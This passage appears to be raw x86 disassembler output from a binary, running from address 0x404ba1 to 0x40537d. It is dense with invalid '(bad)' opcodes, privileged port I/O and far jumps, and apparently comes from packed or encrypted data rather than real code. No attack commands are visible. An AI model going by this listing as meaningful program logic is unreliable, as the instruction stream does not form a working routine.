  404ba1:	jae    0x404b24
  404ba3:	lods   al,BYTE PTR ds:[esi]
  404ba4:	mov    dl,0x19
  404ba6:	ror    DWORD PTR [eax+0x6e96a5df],0x92
  404bad:	ror    BYTE PTR [ebp+0x7d],1
  404bb0:	and    dl,bl
  404bb2:	and    ah,BYTE PTR [eax]
  404bb4:	daa    
  404bb5:	icebp  
  404bb6:	push   0xffffffc4
  404bb8:	ins    DWORD PTR es:[edi],dx
  404bb9:	sbb    dh,BYTE PTR [esi+0x456aea2a]
  404bbf:	loope  0x404bf5
  404bc1:	popa   
  404bc2:	dec    ebp
  404bc3:	fdiv   st(7),st
  404bc5:	cwde   
  404bc6:	pop    es
  404bc7:	mov    eax,ds:0x7fdba324
  404bcc:	mov    ecx,0xbc72e58
  404bd1:	adc    ah,BYTE PTR [edi+0x4b192778]
  404bd7:	mov    ebx,0xc0adde49
  404bdc:	ret    0x3397
  404bdf:	fwait
  404be0:	popf   
  404be1:	retf   0x6f6b
  404be4:	shl    BYTE PTR [ecx+0x70b254bd],cl
  404bea:	retf   
  404beb:	pop    ds
  404bec:	pushf  
  404bed:	iret   
  404bee:	sbb    DWORD PTR [ebx],ecx
  404bf0:	and    DWORD PTR [edx],esi
  404bf2:	sub    BYTE PTR [eax+0x4ad3e60d],al
  404bf8:	sub    DWORD PTR [ecx-0x26],0x69
  404bfc:	cld    
  404bfd:	stos   DWORD PTR es:[edi],eax
  404bfe:	mov    ch,0xda
  404c00:	add    DWORD PTR [esi+0x58],ebp
  404c03:	mov    ch,0xaa
  404c05:	daa    
  404c06:	xchg   edx,eax
  404c07:	stc    
  404c08:	inc    edx
  404c0a:	test   DWORD PTR [ebx+0x68185ffd],ebx
  404c10:	or     ebx,DWORD PTR [edx+0x1d]
  404c13:	sbb    DWORD PTR [ecx-0x51],esi
  404c16:	inc    edi
  404c17:	mov    bl,0x3d
  404c19:	adc    eax,0x5b425731
  404c1e:	cwde   
  404c1f:	jo     0x404c31
  404c21:	cli    
  404c22:	test   al,0x5c
  404c24:	xor    esi,DWORD PTR [ecx]
  404c26:	test   al,0x23
  404c28:	outs   dx,DWORD PTR ds:[esi]
  404c29:	or     dl,BYTE PTR [eax-0x1d]
  404c2c:	mov    ds:0x2a46082d,eax
  404c31:	inc    esi
  404c32:	mov    edi,0x67b0a8ed
  404c37:	and    bh,BYTE PTR es:[edi+eax*1]
  404c3b:	bnd ja 0x404bdd
  404c3e:	push   eax
  404c3f:	mul    DWORD PTR [ebp-0x57399aa9]
  404c45:	xchg   esp,eax
  404c46:	or     ch,dh
  404c48:	sahf   
  404c49:	pop    ecx
  404c4a:	sbb    BYTE PTR [edx],dl
  404c4c:	(bad)  
  404c4d:	popf   
  404c4e:	daa    
  404c4f:	sti    
  404c50:	xchg   dl,bh
  404c52:	out    0xcb,eax
  404c54:	dec    ecx
  404c55:	ja     0x404c3b
  404c57:	add    BYTE PTR [ebx+ebx*8],0x9a
  404c5b:	mov    cl,0xe1
  404c5d:	fmul   DWORD PTR [esp+ebp*2-0x7962bc8f]
  404c64:	push   ss
  404c65:	mov    eax,ds:0xd2ba35c0
  404c6a:	(bad)  
  404c6c:	(bad)  
  404c6d:	popa   
  404c6e:	mov    ebx,?
  404c70:	mov    edx,0xce9e196e
  404c75:	pop    ecx
  404c76:	dec    eax
  404c77:	int3   
  404c78:	dec    esi
  404c79:	push   cs
  404c7a:	cmp    eax,0x14dea466
  404c7f:	sbb    dl,BYTE PTR [eax-0x6e]
  404c82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c83:	call   0x15810a9c
  404c88:	dec    ebx
  404c89:	mov    edx,0x1a4abdc6
  404c8e:	xor    edi,DWORD PTR [edi+ecx*1+0x84e014c]
  404c95:	xchg   DWORD PTR ds:0x4b0e0660,edi
  404c9b:	xor    DWORD PTR [ebx],edx
  404c9d:	ret    0xe820
  404ca0:	scas   al,BYTE PTR es:[edi]
  404ca1:	mov    ebp,0xe2d0b566
  404ca6:	mov    gs,WORD PTR [eax-0x7e]
  404ca9:	test   BYTE PTR [esi+ebp*2],dl
  404cac:	lods   eax,DWORD PTR ds:[esi]
  404cad:	xor    esi,DWORD PTR [ebp-0x7aaea0f3]
  404cb3:	jge    0x404c6b
  404cb5:	adc    DWORD PTR [ebp-0x45],ebx
  404cb8:	xchg   edi,eax
  404cb9:	mov    ebp,0x5e91055f
  404cbe:	add    eax,DWORD PTR [ebx-0x1f]
  404cc1:	xor    al,0x81
  404cc3:	mov    esp,0x1b77face
  404cc8:	scas   al,BYTE PTR es:[edi]
  404cc9:	jno    0x404c4d
  404ccb:	mov    esi,DWORD PTR [ebp-0x2c]
  404cce:	mov    ebp,0xecc59d3a
  404cd3:	jae    0x404c73
  404cd5:	add    BYTE PTR [ebx],bl
  404cd7:	dec    ebp
  404cd8:	mov    ebp,0x947c0f78
  404cdd:	fadd   QWORD PTR [edx+0x2a]
  404ce0:	mov    ebp,0x48b37a
  404ce5:	mov    cl,0x41
  404ce7:	mov    ah,BYTE PTR [ebx-0x6]
  404cea:	sub    al,0xa6
  404cec:	scas   al,BYTE PTR es:[edi]
  404ced:	gs out 0x28,al
  404cf0:	inc    ebx
  404cf1:	out    dx,eax
  404cf2:	int    0x3d
  404cf4:	mov    DWORD PTR [ebp+ebx*1+0x5],edi
  404cf8:	lea    edi,[ebx]
  404cfa:	rcr    BYTE PTR [edi+0x3215afa6],cl
  404d00:	(bad)  
  404d01:	stc    
  404d02:	pop    ss
  404d03:	std    
  404d04:	cmc    
  404d05:	and    al,BYTE PTR [ebx]
  404d07:	mov    dh,0xdb
  404d09:	or     BYTE PTR [eax+0x7c4bd080],bh
  404d0f:	aas    
  404d10:	xor    DWORD PTR [ebx+0xce991fd],0x2bebb9b4
  404d1a:	jl     0x404ce8
  404d1c:	out    0xea,al
  404d1e:	pop    ebx
  404d1f:	xlat   BYTE PTR ds:[ebx]
  404d20:	cs (bad) 
  404d22:	sbb    DWORD PTR [edx-0x7a302dc2],esp
  404d28:	das    
  404d29:	mov    ah,0xef
  404d2b:	dec    ebp
  404d2c:	scas   eax,DWORD PTR es:[edi]
  404d2d:	and    ecx,DWORD PTR [edi+0x68e4644f]
  404d33:	pusha  
  404d34:	leave  
  404d35:	jge    0x404da1
  404d37:	or     ch,BYTE PTR [edx]
  404d39:	jge    0x404d60
  404d3b:	fld    TBYTE PTR [edx+0x68ff38fb]
  404d41:	push   esi
  404d42:	xor    al,0x8a
  404d44:	jl     0x404d68
  404d46:	hlt    
  404d47:	sbb    DWORD PTR ss:[ebx-0x4eebff75],ebx
  404d4e:	or     eax,0x577eb4c5
  404d53:	jl     0x404d09
  404d55:	mov    WORD PTR [ecx+esi*1],es
  404d58:	icebp  
  404d59:	in     eax,dx
  404d5a:	jne    0x404d0a
  404d5c:	mov    al,ds:0x8783635d
  404d61:	retf   0x44f6
  404d64:	pop    edi
  404d65:	repz push esi
  404d67:	mov    esi,0xdac3bb7a
  404d6c:	jg     0x404d03
  404d6e:	int    0x52
  404d70:	push   edi
  404d71:	fbstp  TBYTE PTR [ecx+0x2b7d7369]
  404d77:	ror    BYTE PTR [ebp+0xdda90eb],0x20
  404d7e:	or     BYTE PTR [ecx-0x3b],0x1f
  404d82:	push   esp
  404d83:	mov    ds:0xee35d6f1,eax
  404d88:	inc    esi
  404d89:	jns    0x404d23
  404d8b:	addr16 sub al,0xc1
  404d8e:	shld   eax,eax,0x84
  404d92:	jp     0x404d2a
  404d94:	mov    ebp,DWORD PTR [ebx-0x6fada59]
  404d9a:	popa   
  404d9b:	sub    DWORD PTR [ebp-0x3ba50a0e],edx
  404da1:	test   al,0xa2
  404da3:	shl    BYTE PTR [ebx-0x5a],1
  404da6:	rol    BYTE PTR [ecx-0x79ef0cf3],cl
  404dac:	arpl   WORD PTR [ebx-0x20],ax
  404daf:	das    
  404db0:	jmp    0x198d191f
  404db5:	inc    edi
  404db6:	out    0x9,eax
  404db8:	xchg   esi,eax
  404db9:	mov    ebp,0x3109afde
  404dbe:	jae    0x404db4
  404dc0:	scas   al,BYTE PTR es:[edi]
  404dc1:	mov    ?,WORD PTR [edi]
  404dc3:	into   
  404dc4:	data16 sub bh,BYTE PTR ds:0x33c8aebd
  404dcb:	stos   DWORD PTR es:[edi],eax
  404dcc:	xor    ebx,ecx
  404dce:	add    esi,ecx
  404dd0:	imul   esi,ebp,0x2a
  404dd3:	adc    edx,esi
  404dd5:	xchg   ebx,eax
  404dd6:	push   edi
  404dd7:	xor    dl,BYTE PTR [eax]
  404dd9:	out    dx,eax
  404dda:	add    eax,DWORD PTR ss:[esi+0x4ada2682]
  404de1:	ja     0x404d7a
  404de3:	cmc    
  404de4:	cs xchg edx,eax
  404de6:	mov    ah,0x9e
  404de8:	sbb    eax,0x6d5be9bc
  404ded:	pushf  
  404dee:	jl     0x404df7
  404df0:	pop    esi
  404df1:	pop    esi
  404df2:	fsub   st,st(6)
  404df4:	xchg   esi,eax
  404df5:	adc    BYTE PTR [edx],cl
  404df7:	(bad)  
  404df8:	add    edx,DWORD PTR [eax]
  404dfa:	clc    
  404dfb:	push   esi
  404dfc:	out    0x1b,al
  404dfe:	xchg   edx,eax
  404dff:	pop    ss
  404e00:	dec    ecx
  404e01:	adc    bh,BYTE PTR [esi]
  404e03:	lods   al,BYTE PTR ds:[esi]
  404e04:	cmp    DWORD PTR [ebp-0x2299de4f],ecx
  404e0a:	mov    ebp,0x2f3faff1
  404e0f:	push   es
  404e10:	ret    0x3213
  404e13:	push   esp
  404e14:	fmul   QWORD PTR [eax]
  404e16:	retf   0xa628
  404e19:	mov    ds:0x26837769,al
  404e1e:	cmc    
  404e1f:	repz and DWORD PTR [edi+0x4c6fdca4],ebp
  404e26:	push   ds
  404e27:	mov    bl,0x6c
  404e29:	dec    ebx
  404e2a:	mov    ds:0x28a2479d,eax
  404e2f:	mov    edx,edi
  404e31:	add    al,0x3b
  404e33:	outs   dx,BYTE PTR ds:[esi]
  404e34:	sub    eax,edi
  404e36:	bound  eax,QWORD PTR [esp+edx*2+0x780af9e5]
  404e3d:	fsubr  DWORD PTR [esi]
  404e3f:	inc    esp
  404e40:	xchg   BYTE PTR [ecx-0x73176fa5],bh
  404e46:	sub    eax,0xb4e1afd2
  404e4b:	inc    ebx
  404e4c:	dec    eax
  404e4d:	nop
  404e4e:	nop
  404e4f:	dec    eax
  404e50:	cmp    al,0x22
  404e52:	pop    ecx
  404e53:	clc    
  404e54:	xchg   ecx,eax
  404e55:	mov    dh,BYTE PTR ds:0x790161b9
  404e5b:	stc    
  404e5c:	(bad)  
  404e5d:	pop    esi
  404e5e:	sub    DWORD PTR [ecx+ebp*4+0xd],edx
  404e62:	add    dh,al
  404e64:	sbb    al,0xde
  404e66:	and    al,BYTE PTR [eax-0x67]
  404e69:	inc    edi
  404e6a:	xchg   ebp,eax
  404e6b:	test   DWORD PTR [edx-0x2822a5bd],0x18dd86e3
  404e75:	or     eax,DWORD PTR [edi]
  404e77:	adc    eax,0x1de75fd2
  404e7c:	push   ebp
  404e7d:	jmp    0xf998:0x263a7d99
  404e84:	and    al,0xe5
  404e86:	push   ebx
  404e87:	(bad)  
  404e89:	ds xchg edx,eax
  404e8b:	add    esp,DWORD PTR [edx+0x38]
  404e8e:	sbb    DWORD PTR [edx+0x4a],ebp
  404e91:	cdq    
  404e92:	fcmovb st,st(3)
  404e94:	push   0x26631cb2
  404e99:	in     eax,0x75
  404e9b:	xchg   DWORD PTR [eax-0x1],ecx
  404e9e:	add    cl,al
  404ea0:	ds pop edi
  404ea2:	add    DWORD PTR [eax],0xdadc89c4
  404ea8:	jbe    0x404e55
  404eaa:	or     al,0x76
  404eac:	cmc    
  404ead:	call   0x6a18:0x85ae3c8d
  404eb4:	dec    ecx
  404eb5:	mov    edx,0x878baf8a
  404eba:	xchg   al,bh
  404ebc:	pop    esp
  404ebd:	ins    DWORD PTR es:[edi],dx
  404ebe:	inc    esp
  404ebf:	xchg   esp,eax
  404ec0:	dec    ebx
  404ec1:	xchg   esp,eax
  404ec2:	mov    ah,BYTE PTR [eax-0x6f38ed3]
  404ec8:	addr16 mov dh,0xf2
  404ecb:	in     eax,0x36
  404ecd:	xlat   BYTE PTR ds:[ebx]
  404ece:	loop   0x404ee4
  404ed0:	mov    ecx,0x353531f0
  404ed5:	iret   
  404ed6:	stc    
  404ed7:	(bad)  
  404ed8:	stc    
  404ed9:	neg    BYTE PTR [edx+edi*1-0x22]
  404edd:	xchg   ecx,eax
  404ede:	cmp    DWORD PTR [ecx],0xffffff97
  404ee1:	mov    eax,ds:0x9be455cc
  404ee6:	out    dx,al
  404ee7:	and    BYTE PTR [esi],dh
  404ee9:	and    eax,0x66de5ada
  404eee:	jmp    0x6aa6:0xd6ac0d05
  404ef5:	or     ch,BYTE PTR [edi]
  404ef7:	test   eax,0x9d7a2c7a
  404efc:	inc    ecx
  404efd:	scas   al,BYTE PTR es:[edi]
  404efe:	ror    DWORD PTR [ebx],1
  404f00:	xchg   ebp,eax
  404f01:	inc    ecx
  404f02:	pop    ds
  404f03:	xchg   DWORD PTR [edx],ebx
  404f05:	(bad)  
  404f06:	int3   
  404f07:	cmc    
  404f08:	das    
  404f09:	ret    
  404f0a:	sahf   
  404f0b:	jge    0x404f84
  404f0d:	repz or eax,0x89fcd8e9
  404f13:	and    DWORD PTR [esi],eax
  404f15:	loope  0x404ecf
  404f17:	mov    al,dl
  404f19:	dec    eax
  404f1a:	ins    DWORD PTR es:[edi],dx
  404f1b:	push   ebp
  404f1c:	push   0xc76772dd
  404f21:	push   0xedc3e8dd
  404f26:	mov    eax,0x5725ab18
  404f2b:	push   cs
  404f2c:	ss xor al,0xc2
  404f2f:	mov    bl,0xeb
  404f31:	adc    al,0x70
  404f33:	(bad)  [ebp-0x76d23e56]
  404f39:	dec    esp
  404f3a:	xchg   edi,eax
  404f3b:	arpl   dx,di
  404f3d:	cli    
  404f3e:	xchg   edx,eax
  404f3f:	out    dx,al
  404f40:	and    al,0x77
  404f42:	add    eax,0x5fd4b022
  404f47:	cmp    al,0x96
  404f49:	lock retf 0x56e7
  404f4d:	dec    eax
  404f4e:	(bad)  
  404f50:	adc    al,0x21
  404f52:	xchg   esp,eax
  404f53:	vandnps xmm3,xmm6,XMMWORD PTR [edx-0xd6e725f]
  404f5b:	sub    DWORD PTR [ebx-0x61ab6906],0xfffffff2
  404f62:	xor    ah,BYTE PTR [bp+di-0xef0]
  404f67:	mov    bl,ah
  404f69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f6a:	in     eax,0x8f
  404f6c:	add    esp,DWORD PTR ds:[ebp-0x70]
  404f70:	imul   edi,DWORD PTR [ebp-0x67654cc3],0x159192d2
  404f7a:	push   esp
  404f7b:	sbb    edi,ebx
  404f7d:	int3   
  404f7e:	repz fs push 0xb2843ba1
  404f85:	jle    0x404fe7
  404f87:	popf   
  404f88:	daa    
  404f89:	hlt    
  404f8a:	jge    0x404fc1
  404f8c:	mov    eax,0xed4dd6f8
  404f91:	call   0x37de:0xf63cb042
  404f98:	mov    ds:0xc7a83bde,al
  404f9d:	mov    al,BYTE PTR [esi-0x26df9832]
  404fa3:	xchg   al,dl
  404fa5:	and    al,0x8
  404fa7:	jge    0x404f8f
  404fa9:	cwde   
  404faa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404fab:	mov    al,ds:0xcce797f0
  404fb0:	dec    edi
  404fb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404fb2:	imul   esi,DWORD PTR [eax],0xffffffc1
  404fb5:	lock dec edx
  404fb7:	rol    DWORD PTR [ebx+ebx*1+0x4b3aa8a3],1
  404fbe:	pushf  
  404fbf:	outs   dx,DWORD PTR ds:[esi]
  404fc0:	jg     0x404ff3
  404fc2:	inc    edx
  404fc3:	daa    
  404fc4:	inc    edx
  404fc5:	pop    ebx
  404fc6:	push   edx
  404fc7:	xchg   DWORD PTR [ebx],ebp
  404fc9:	jbe    0x404fb9
  404fcb:	adc    ah,dl
  404fcd:	add    al,0x2b
  404fcf:	out    0xc7,al
  404fd1:	mov    bl,0x4
  404fd3:	cmp    DWORD PTR [edi-0x2a],0x72
  404fd7:	(bad)  
  404fd8:	aas    
  404fd9:	pop    ecx
  404fda:	shl    cl,1
  404fdc:	call   0x1f1b:0x488454a1
  404fe3:	mov    WORD PTR [edx+esi*8-0x50],es
  404fe7:	cmp    eax,0xf31b4ac6
  404fec:	scas   eax,DWORD PTR es:[edi]
  404fed:	xchg   bl,ah
  404fef:	push   edi
  404ff0:	or     eax,0xb0e917fe
  404ff5:	pop    ecx
  404ff6:	adc    eax,0xd706f17d
  404ffb:	fidiv  WORD PTR [edi+0x77643ae3]
  405001:	cmc    
  405002:	hlt    
  405003:	sbb    ebp,DWORD PTR [esi+0x4a]
  405006:	inc    ecx
  405007:	sbb    dh,dh
  405009:	push   esi
  40500a:	jb     0x405086
  40500c:	and    edi,DWORD PTR [edx+0x53]
  40500f:	xor    eax,0xb1d202ee
  405014:	cmp    bl,BYTE PTR [ebp+ebp*2-0x7aa38743]
  40501b:	mov    ebx,0x8fef36f7
  405020:	xor    esi,0xffffff8c
  405023:	mov    dl,0xcc
  405025:	xchg   esp,eax
  405026:	test   DWORD PTR [edx+0x2b],esi
  405029:	in     al,dx
  40502a:	leave  
  40502b:	inc    eax
  40502c:	and    eax,0xa0e4f43c
  405031:	push   0xffffffc2
  405033:	mov    ecx,eax
  405035:	call   0xddde:0xfb8b8c92
  40503c:	ds aad 0x42
  40503f:	lahf   
  405040:	nop
  405041:	jle    0x404fc9
  405043:	arpl   si,dx
  405045:	(bad)  
  405046:	jno    0x404fe8
  405048:	cmp    DWORD PTR [ecx+0xf],ebx
  40504b:	out    0x4,al
  40504d:	push   edi
  40504e:	jne    0x405048
  405050:	dec    edi
  405051:	or     eax,0xa921381
  405056:	mov    ecx,0xd8f5bd42
  40505b:	push   ebp
  40505c:	(bad)  
  40505d:	sti    
  40505e:	or     ah,0x3e
  405061:	mov    bh,0x99
  405063:	(bad)  
  405064:	mov    cl,0x52
  405066:	and    eax,edx
  405068:	inc    eax
  405069:	mov    eax,ds:0x1e10aa9c
  40506e:	cli    
  40506f:	add    esp,DWORD PTR [ebx+0x4def7acf]
  405075:	mov    esi,0x64856fd0
  40507a:	jge    0x405043
  40507c:	push   eax
  40507d:	imul   DWORD PTR [esi+edx*1+0x5e]
  405081:	or     BYTE PTR [eax+0x5bcc6940],ah
  405087:	loopne 0x4050f7
  405089:	not    edi
  40508b:	pop    es
  40508c:	add    al,0x87
  40508e:	aam    0x1b
  405090:	xchg   esi,eax
  405091:	mov    dh,0x22
  405093:	dec    ebp
  405094:	add    ebp,esp
  405096:	pop    es
  405097:	(bad)  
  405098:	mov    dh,0x8
  40509a:	mov    bl,0xc6
  40509c:	inc    eax
  40509d:	stc    
  40509e:	inc    esi
  40509f:	neg    ch
  4050a1:	fistp  WORD PTR [esi-0x29cdff28]
  4050a7:	xchg   edi,eax
  4050a8:	mov    eax,0x7ed85140
  4050ad:	jo     0x40509f
  4050af:	test   eax,0x39b2470f
  4050b4:	push   ss
  4050b5:	dec    esp
  4050b6:	or     BYTE PTR [ebp-0x14],dh
  4050b9:	les    esi,FWORD PTR [eax-0x6e]
  4050bc:	cmp    BYTE PTR [eax],dh
  4050be:	mov    edi,0x3b14d889
  4050c3:	int3   
  4050c4:	addr16 iret 
  4050c6:	scas   eax,DWORD PTR es:[edi]
  4050c7:	pop    ss
  4050c8:	and    al,0x7f
  4050ca:	outs   dx,BYTE PTR ds:[esi]
  4050cb:	jg     0x40508f
  4050cd:	aad    0xf7
  4050cf:	sti    
  4050d0:	sar    BYTE PTR [edx],cl
  4050d2:	mov    edx,0x5f02b23f
  4050d7:	out    dx,eax
  4050d8:	jmp    0x6f41f4c7
  4050dd:	xchg   edi,eax
  4050de:	mov    esi,DWORD PTR [ebx]
  4050e0:	jmp    0x51ac:0x101f9c4f
  4050e7:	jns    0x4050db
  4050e9:	shr    DWORD PTR [esi-0x1],1
  4050ec:	popf   
  4050ed:	das    
  4050ee:	test   BYTE PTR [esp+ecx*4-0x1e65847c],bl
  4050f5:	in     al,0xed
  4050f7:	pusha  
  4050f8:	ror    DWORD PTR [esi+esi*8+0x2b57aabf],cl
  4050ff:	shl    BYTE PTR [eax+0x34],0xd2
  405103:	jns    0x405120
  405105:	dec    ebx
  405106:	mov    es,WORD PTR cs:[ecx+0x63]
  40510a:	dec    edi
  40510b:	mov    ecx,ebp
  40510d:	dec    ebp
  40510e:	pop    edi
  40510f:	jl     0x405115
  405111:	and    BYTE PTR [ebx],bl
  405113:	ja     0x40516e
  405115:	out    dx,eax
  405116:	or     edx,DWORD PTR [edx-0x15164a1e]
  40511c:	pop    edx
  40511d:	(bad)  
  40511e:	loopne 0x405135
  405120:	add    BYTE PTR [ebp+0xa],dl
  405123:	out    0xcd,al
  405125:	mov    cl,0x40
  405127:	mov    esp,0x1c99abb8
  40512c:	cld    
  40512d:	pushf  
  40512e:	scas   eax,DWORD PTR es:[edi]
  40512f:	inc    ebx
  405130:	push   ss
  405131:	shl    DWORD PTR [edx-0x7572fec2],1
  405137:	or     ecx,ebx
  405139:	es ss aas 
  40513c:	and    eax,ebx
  40513e:	mov    ebx,DWORD PTR [eax]
  405140:	sahf   
  405141:	out    dx,al
  405142:	mov    dl,0x60
  405144:	inc    esi
  405145:	dec    esp
  405146:	popf   
  405147:	add    BYTE PTR [eax+0x400c6c2c],0x8
  40514e:	pop    esp
  40514f:	inc    ebx
  405150:	jbe    0x4051a4
  405152:	fisttp DWORD PTR [ecx+0x4e]
  405155:	fld    DWORD PTR [edx-0x6b1235aa]
  40515b:	add    DWORD PTR ds:0x18668e33,edx
  405161:	sar    BYTE PTR [ecx],cl
  405163:	dec    esp
  405164:	sbb    BYTE PTR [edi],ch
  405166:	push   0xd0365b28
  40516b:	in     eax,dx
  40516c:	hlt    
  40516d:	push   0xffffff95
  40516f:	daa    
  405170:	in     eax,0x14
  405172:	pusha  
  405173:	cmp    BYTE PTR [esp+edi*8+0x26],dh
  405177:	lds    esp,FWORD PTR [edi+0x2398fbdd]
  40517d:	add    DWORD PTR [ecx-0x21],0xea7f5334
  405184:	ja     0x405175
  405186:	scas   al,BYTE PTR es:[edi]
  405187:	popa   
  405188:	adc    bl,0x78
  40518b:	and    eax,0x2226b1b0
  405190:	jnp    0x40511f
  405192:	fisub  DWORD PTR [esi+esi*8+0x385a30e7]
  405199:	mov    BYTE PTR [ebp+0x16],dl
  40519c:	arpl   bp,bp
  40519e:	mov    bh,0xb0
  4051a0:	dec    esp
  4051a1:	push   edx
  4051a2:	stos   BYTE PTR es:[edi],al
  4051a3:	sub    DWORD PTR [esi-0x4231b0d2],edx
  4051a9:	sar    DWORD PTR [edi-0x3001be2c],0x23
  4051b0:	jb     0x4051bc
  4051b2:	ins    DWORD PTR es:[edi],dx
  4051b3:	sbb    eax,0xd3bd5c12
  4051b8:	cmp    bl,dl
  4051ba:	ror    cl,1
  4051bc:	out    0xdb,eax
  4051be:	rcl    cl,0xd8
  4051c1:	fnstenv [esi]
  4051c3:	sbb    eax,0xc0a99058
  4051c8:	lds    ebp,FWORD PTR [esi+edx*8]
  4051cb:	xor    eax,0xc788e2d2
  4051d0:	int    0x59
  4051d2:	aam    0xcd
  4051d4:	bound  eax,QWORD PTR [ebx+0x6b]
  4051d7:	scas   eax,DWORD PTR es:[edi]
  4051d8:	push   esp
  4051d9:	dec    ebp
  4051da:	dec    edi
  4051db:	add    dh,BYTE PTR [ebp+0x6]
  4051de:	sbb    eax,0x3cd60926
  4051e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051e4:	in     al,dx
  4051e5:	cld    
  4051e6:	lods   al,BYTE PTR ds:[esi]
  4051e7:	rcr    edi,1
  4051e9:	adc    al,0xd4
  4051eb:	imul   eax,DWORD PTR [edi+0x69],0xc7aa3f29
  4051f2:	adc    dl,BYTE PTR [eax+0x9]
  4051f5:	xchg   ebp,eax
  4051f6:	jle    0x405183
  4051f8:	fdiv   DWORD PTR ds:0xf17d80b4
  4051fe:	lock cwde 
  405200:	lods   eax,DWORD PTR ds:[esi]
  405201:	sub    BYTE PTR [ebx+0x6c926fa1],dh
  405207:	cmp    al,0xe1
  405209:	mov    ebx,0xc84126d2
  40520e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40520f:	js     0x405273
  405211:	call   0xa0911194
  405216:	int    0xe0
  405218:	mov    ebp,0x9892393a
  40521d:	imul   ecx,DWORD PTR [ebx],0x5713bdce
  405223:	icebp  
  405224:	in     al,0x7b
  405226:	call   0x1902:0xcf4179db
  40522d:	mov    al,gs:0x1a716ac9
  405233:	cmp    al,BYTE PTR es:[edi+ecx*1-0x27]
  405238:	pop    esi
  405239:	xchg   ecx,eax
  40523a:	pop    eax
  40523b:	repz icebp 
  40523d:	mov    edi,0xd0d558ee
  405242:	adc    eax,DWORD PTR [ebx+0x37a3ea0b]
  405248:	clc    
  405249:	sub    BYTE PTR [ecx+0x2929155d],ah
  40524f:	cmp    ch,BYTE PTR gs:[edx-0x602cc8a1]
  405256:	mov    bl,0x91
  405259:	mov    dh,BYTE PTR ds:0x43ae763e
  40525f:	or     ch,dh
  405261:	jne    0x40521c
  405263:	in     al,dx
  405264:	pop    ecx
  405265:	push   0xffffffc9
  405267:	stos   BYTE PTR es:[edi],al
  405268:	push   ebx
  405269:	dec    esp
  40526a:	pop    esi
  40526b:	in     eax,0xf2
  40526d:	and    eax,0xb7ce0e6a
  405272:	mov    ebx,0xed13ab4d
  405277:	sbb    dl,0x67
  40527a:	lock std 
  40527c:	xchg   ebp,eax
  40527d:	adc    cl,al
  40527f:	inc    ebx
  405280:	cmc    
  405281:	fwait
  405282:	repnz aad 0x22
  405285:	dec    esp
  405286:	mov    ch,BYTE PTR [edi]
  405288:	mov    edi,0x3e2b13a9
  40528d:	add    bl,BYTE PTR [esp+ecx*4-0x1914c7ab]
  405294:	or     dl,BYTE PTR [ebx]
  405296:	mov    cl,BYTE PTR [eax]
  405298:	jae    0x405233
  40529a:	dec    ebx
  40529b:	push   ecx
  40529c:	lea    esp,ds:[bx+di]
  4052a0:	repz pop eax
  4052a2:	ret    
  4052a3:	mov    eax,ds:0xb19f6d3
  4052a8:	mov    ebx,0x55ebbdfb
  4052ad:	(bad)  
  4052ae:	(bad)  
  4052af:	scas   eax,DWORD PTR es:[edi]
  4052b0:	sub    al,0x6
  4052b2:	jmp    0x4052f4
  4052b4:	aad    0x6c
  4052b6:	push   ds
  4052b7:	mov    edi,0xb36ec956
  4052bc:	or     ebx,DWORD PTR ds:0xaf7d6958
  4052c2:	nop
  4052c3:	int3   
  4052c4:	test   bh,ch
  4052c6:	dec    ebx
  4052c7:	dec    eax
  4052c8:	dec    edi
  4052c9:	add    esp,DWORD PTR [edx-0x4ec2b94d]
  4052cf:	les    edi,FWORD PTR ds:0xc11a4f06
  4052d5:	jnp    0x405270
  4052d7:	mov    ebp,0xcfd8aa33
  4052dc:	stc    
  4052dd:	out    dx,al
  4052de:	adc    BYTE PTR ds:0xc3a83c0c,al
  4052e4:	fmul   DWORD PTR [esi+0x4165df75]
  4052ea:	mov    al,0x19
  4052ec:	std    
  4052ed:	shl    BYTE PTR [edx],1
  4052ef:	pop    ss
  4052f0:	xchg   edi,eax
  4052f1:	loop   0x4052d6
  4052f3:	xor    ecx,edx
  4052f5:	push   0x8
  4052f7:	sub    DWORD PTR [ebp+0x6a69786e],edi
  4052fd:	loop   0x4052a3
  4052ff:	inc    edx
  405300:	inc    ebp
  405301:	cmp    DWORD PTR [ebp-0x1d5db1b6],esp
  405307:	pushf  
  405308:	test   DWORD PTR [edi+eiz*2+0x26],esp
  40530c:	xchg   edi,eax
  40530d:	and    eax,DWORD PTR [esi-0xa]
  405310:	pop    ds
  405311:	mov    ebx,0xac462bad
  405316:	out    0x86,eax
  405318:	dec    ecx
  405319:	and    BYTE PTR [ebx+0x1c],dh
  40531c:	repnz sbb al,BYTE PTR [edx]
  40531f:	cmp    BYTE PTR [eax],dl
  405321:	xchg   ebp,eax
  405322:	inc    edi
  405323:	xchg   edx,eax
  405324:	cmp    al,0x8b
  405326:	ffree  st(0)
  405328:	in     al,0x5d
  40532a:	adc    DWORD PTR [esi+ecx*8-0x6a99f4f1],eax
  405331:	mov    al,ds:0x674a7ca3
  405336:	push   edi
  405337:	(bad)  
  405338:	fstp   TBYTE PTR [edx]
  40533a:	lds    eax,FWORD PTR [eax+0x69]
  40533d:	cs pop esi
  40533f:	rcr    DWORD PTR [edi-0x4e3ab2df],cl
  405345:	ins    DWORD PTR es:[edi],dx
  405346:	sub    edx,0xffffff94
  405349:	dec    esi
  40534a:	retf   
  40534b:	es (bad) 
  40534d:	push   ebx
  40534e:	loopne 0x405302
  405350:	jae    0x40539a
  405352:	ins    BYTE PTR es:[edi],dx
  405353:	fbld   TBYTE PTR [ecx-0x69]
  405356:	adc    al,dh
  405358:	dec    ecx
  405359:	push   ss
  40535a:	inc    esi
  40535b:	jne    0x4053b3
  40535d:	push   edx
  40535e:	loop   0x40530d
  405360:	pop    edx
  405361:	inc    edi
  405362:	lods   al,BYTE PTR ds:[esi]
  405363:	mov    bl,0x98
  405365:	js     0x4053cc
  405367:	fucomp st(1)
  405369:	dec    ebx
  40536a:	mov    dl,0xdc
  40536c:	mov    dl,0xb6
  40536e:	pop    ds
  40536f:	into   
  405370:	leave  
  405371:	pop    eax
  405372:	sub    eax,0x293748f2
  405377:	push   es
  405378:	je     0x405306
  40537a:	pop    es
  40537b:	icebp  
  40537c:	das    
  40537d:	fild   QWORD PTR [eax+edi*2-0x30954c65]
